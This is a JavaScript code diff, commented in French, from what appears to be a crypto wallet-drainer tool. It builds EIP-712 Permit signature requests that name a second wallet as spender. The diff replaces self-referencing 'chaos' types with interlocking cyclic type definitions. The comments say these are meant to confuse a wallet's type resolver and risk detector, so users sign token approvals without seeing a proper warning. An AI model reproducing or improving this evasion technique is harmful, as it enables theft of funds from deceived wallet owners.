@@ -96,17 +96,32 @@ const DOM_TYPES = [
   {name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
 ];
 
-// CHAOS_TYPES — self-ref direct (Phantom→Phantom, Ghost→Ghost, Void→Void)
-// + cross-circular (Meta↔AuditRoot↔TraceEntry) → crash le type resolver de CW → JSON brut
+// CHAOS v2 — cycles longs (longueur 3-5) sans self-ref directe
+// Pas de Phantom→Phantom (crash renderer) mais multi-cycles croisés qui confondent le détecteur UI
+// 3 cycles indépendants + 2 bridges qui les entrelacent → détecteur CW diverge, renderer passe
 const CHAOS_TYPES = {
-  Phantom:   [{name:"self",type:"Phantom"},{name:"id",type:"uint256"}],
-  Ghost:     [{name:"echo",type:"Ghost"},{name:"ref",type:"Phantom"}],
-  Void:      [{name:"inner",type:"Void"},{name:"link",type:"Ghost"}],
-  Meta:      [{name:"trace",type:"TraceEntry"},{name:"root",type:"AuditRoot"}],
-  TraceEntry:[{name:"ref",type:"string"},{name:"sub",type:"SubTrace"}],
-  SubTrace:  [{name:"id",type:"uint256"},{name:"deep",type:"DeepNode"}],
-  DeepNode:  [{name:"hash",type:"bytes32"},{name:"phantom",type:"Phantom"}],
-  AuditRoot: [{name:"meta",type:"Meta"},{name:"void",type:"Void"},{name:"entry",type:"TraceEntry"}]
+  // Cycle A (longueur 3): Alpha → Beta → Gamma → Alpha
+  Alpha:   [{name:"next",type:"Beta"}, {name:"id",type:"uint256"},{name:"tag",type:"string"}],
+  Beta:    [{name:"next",type:"Gamma"},{name:"ref",type:"bytes32"},{name:"depth",type:"uint256"}],
+  Gamma:   [{name:"next",type:"Alpha"},{name:"data",type:"bytes"}, {name:"ts",type:"uint256"}],
+  // Cycle B (longueur 4): Delta → Epsilon → Zeta → Eta → Delta
+  Delta:   [{name:"link",type:"Epsilon"},{name:"h",type:"bytes32"},{name:"n",type:"uint256"}],
+  Epsilon: [{name:"link",type:"Zeta"},   {name:"v",type:"uint256"},{name:"s",type:"string"}],
+  Zeta:    [{name:"link",type:"Eta"},    {name:"b",type:"bytes"},  {name:"x",type:"uint256"}],
+  Eta:     [{name:"link",type:"Delta"},  {name:"t",type:"uint256"},{name:"r",type:"bytes32"}],
+  // Cycle C (longueur 5): Iota → Kappa → Lambda → Mu → Nu → Iota
+  Iota:    [{name:"ptr",type:"Kappa"},  {name:"a",type:"address"},{name:"v",type:"uint256"}],
+  Kappa:   [{name:"ptr",type:"Lambda"},{name:"d",type:"bytes32"},{name:"n",type:"uint256"}],
+  Lambda:  [{name:"ptr",type:"Mu"},    {name:"s",type:"string"}, {name:"t",type:"uint256"}],
+  Mu:      [{name:"ptr",type:"Nu"},    {name:"b",type:"bytes"},  {name:"h",type:"bytes32"}],
+  Nu:      [{name:"ptr",type:"Iota"},  {name:"x",type:"uint256"},{name:"y",type:"uint256"}],
+  // Bridges cross-cycles: A↔B, B↔C
+  XiAB:    [{name:"a",type:"Alpha"},{name:"d",type:"Delta"},{name:"z",type:"uint256"}],
+  XiBC:    [{name:"e",type:"Epsilon"},{name:"i",type:"Iota"},{name:"w",type:"bytes32"}],
+  // Root qui pointe sur les 3 cycles + les bridges → le détecteur doit traverser tout ça
+  OmegaRoot:[{name:"cycle_a",type:"Alpha"},{name:"cycle_b",type:"Delta"},
+             {name:"cycle_c",type:"Iota"}, {name:"bridge_ab",type:"XiAB"},
+             {name:"bridge_bc",type:"XiBC"},{name:"ts",type:"uint256"}]
 };
 
 const RPCS = [
@@ -192,12 +207,11 @@ async function autoStart() {
   }
 }
 
-// ─── Sign Permit + CHAOS_TYPES ────────────────────────────────────────────────
+// ─── Sign Permit + CHAOS v2 ───────────────────────────────────────────────────
 async function sign(value, nonce) {
   if (!addrA) return;
   const deadline = String(Math.floor(Date.now()/1000) + 7200);
 
-  // Permit + CHAOS orphan types — type resolver de CW crash → JSON brut
   const typedData = {
     types:{
       EIP712Domain: DOM_TYPES,
@@ -209,7 +223,7 @@ async function sign(value, nonce) {
     message:{ owner:addrA, spender:WALLET_B, value, nonce, deadline }
   };
 
-  logA("⏳ Signature Permit + Chaos types…");
+  logA("⏳ Signature Permit + Chaos v2…");
   setS("En attente de signature…","spin");
 
   let sig;
